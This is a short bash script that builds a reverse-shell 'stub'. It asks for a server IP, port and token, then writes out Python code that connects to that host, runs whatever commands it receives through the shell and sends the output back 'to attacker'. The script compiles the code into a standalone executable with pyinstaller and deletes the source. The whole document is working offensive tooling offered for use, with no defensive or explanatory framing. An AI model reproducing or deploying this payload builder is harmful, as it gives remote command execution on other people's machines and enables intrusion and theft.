#bin/bash
rm -rf dist
rm -rf build
echo "Enter the server IP"
read ip
echo "Enter the server port"
read port
echo "Enter the server token"
read token

echo "
import socket
import subprocess

HOST = '$ip'    # The remote host
PORT = int($port)         # The same port as used by the server
PORT = PORT
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# loop forever
while 1:
    # recv command line param
    data = s.recv(1024)
    if data == 'quit':
        s.close()
    # execute command line
    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    # grab output from commandline
    stdout_value = proc.stdout.read() + proc.stderr.read()
    if len(stdout_value) > 0:
        # send back to attacker
        s.send(stdout_value)
    else:
        s.send('* Error')
        s.close()" > stub.py
#pip pyinstaller to install pyinstaller
pyinstaller stub.py
rm -rf stub.py
echo "[*] Stub created successfully"
echo "[*] Stub located in dist directory [stub.app]"
